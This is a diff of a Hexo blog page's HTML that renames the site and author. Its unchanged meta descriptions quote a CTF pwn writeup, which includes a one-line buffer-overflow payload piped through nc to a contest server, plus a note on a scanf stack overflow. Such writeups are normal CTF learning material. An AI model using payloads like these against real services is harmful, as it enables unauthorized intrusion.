@@ -6,21 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>【CFF2016-pwn】 Writeup | Hexo</title>
+  <title>【CFF2016-pwn】 Writeup | WinterSun Space</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="pwn1简单的变量覆盖。 12python -c &amp;apos;print &amp;quot;a&amp;quot;*0x40+&amp;quot;\x1b\x86\x04\x08&amp;quot;&amp;apos;|nc 139.196.232.222 54000一发带走  pwn2scanf没有限制输入字节，可发送超长字符串导致栈溢出。 只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&amp;quot;/bin/sh\">
 <meta name="keywords" content="pwn,Writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【CFF2016-pwn】 Writeup">
 <meta property="og:url" content="http://yoursite.com/2016/06/20/CCF2016/index.html">
-<meta property="og:site_name" content="Hexo">
+<meta property="og:site_name" content="WinterSun Space">
 <meta property="og:description" content="pwn1简单的变量覆盖。 12python -c &amp;apos;print &amp;quot;a&amp;quot;*0x40+&amp;quot;\x1b\x86\x04\x08&amp;quot;&amp;apos;|nc 139.196.232.222 54000一发带走  pwn2scanf没有限制输入字节，可发送超长字符串导致栈溢出。 只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&amp;quot;/bin/sh\">
 <meta property="og:updated_time" content="2016-12-20T02:38:20.014Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【CFF2016-pwn】 Writeup">
 <meta name="twitter:description" content="pwn1简单的变量覆盖。 12python -c &amp;apos;print &amp;quot;a&amp;quot;*0x40+&amp;quot;\x1b\x86\x04\x08&amp;quot;&amp;apos;|nc 139.196.232.222 54000一发带走  pwn2scanf没有限制输入字节，可发送超长字符串导致栈溢出。 只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&amp;quot;/bin/sh\">
   
-    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    <link rel="alternative" href="/atom.xml" title="WinterSun Space" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
@@ -44,7 +44,7 @@
 		</a>
 
 		<hgroup>
-		  <h1 class="header-author"><a href="/">John Doe</a></h1>
+		  <h1 class="header-author"><a href="/">WinterSun</a></h1>
 		</hgroup>
 
 		
@@ -94,7 +94,7 @@
       <nav id="mobile-nav">
   	<div class="overlay">
   		<div class="slider-trigger"><i class="icon-sort"></i></div>
-  		<h1 class="header-author js-mobile-header hide">John Doe</h1>
+  		<h1 class="header-author js-mobile-header hide">WinterSun</h1>
   	</div>
 	<div class="intrude-less">
 		<header id="header" class="inner">
@@ -102,7 +102,7 @@
 				<img src="https://avatars1.githubusercontent.com/u/12570968?v=3&amp;s=460" class="js-avatar">
 			</div>
 			<hgroup>
-			  <h1 class="header-author">John Doe</h1>
+			  <h1 class="header-author">WinterSun</h1>
 			</hgroup>
 			
 			<nav class="header-menu">
@@ -293,7 +293,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2017 John Doe
+    		&copy; 2017 WinterSun
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
